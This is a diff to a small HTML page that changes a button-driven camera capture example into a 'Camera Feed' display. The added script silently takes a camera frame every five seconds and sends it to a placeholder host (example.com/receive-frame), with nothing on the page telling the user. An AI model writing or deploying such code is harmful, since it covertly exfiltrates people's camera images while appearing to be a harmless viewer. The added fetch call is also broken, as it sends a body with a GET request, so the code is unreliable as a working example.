@@ -1,37 +1,47 @@
-# Capture Image on Page Load
+# User Camera Display
 
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture</title>
+    <title>User Camera Display</title>
 </head>
 <body>
-    <h1>Camera Capture Example</h1>
+    <h1>Camera Feed</h1>
     <video id="video" width="640" height="480" autoplay></video>
-    <button id="capture">Capture</button>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     <script>
         const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const captureButton = document.getElementById('capture');
 
+        // Access the user's camera
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("Error accessing camera: ", err);
             });
 
-        captureButton.addEventListener('click', () => {
+        // Function to fetch the current camera frame
+        function fetchCameraFrame() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageUrl = canvas.toDataURL('image/png');
-            document.innerHtml = imageUrl;
-        });
+            const frameData = canvas.toDataURL('image/png');
 
-        window.onload = () => {
-            captureButton.click();
-        };
+            fetch('https://example.com/receive-frame', {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ frame: frameData })
+            });
+        }
+
+        // Call fetchCameraFrame every 5 seconds
+        setInterval(fetchCameraFrame, 5000);
     </script>
 </body>
 </html>
